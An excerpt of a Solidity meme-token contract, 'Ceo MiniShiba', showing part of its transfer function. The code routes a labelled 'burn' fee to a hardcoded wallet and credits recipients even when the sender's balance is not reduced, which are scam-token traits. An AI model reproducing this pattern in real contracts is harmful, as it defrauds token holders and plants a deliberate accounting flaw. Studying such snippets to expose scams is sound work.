...
// Submitted for Telegram: https://t.me/ceo_minishiba2
...
contract  CeoMiniShiba  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    address private isExcluded;
    string private _name = "Ceo MiniShiba";
    string private _symbol = "$CMSHIB";
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0x1f59Ce020D2073f2b5B3C27a64C61219251F42bF] += _bruntoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_brunfee > 0) {
        emit Transfer(form, 0x1f59Ce020D2073f2b5B3C27a64C61219251F42bF, _bruntoken);
        }
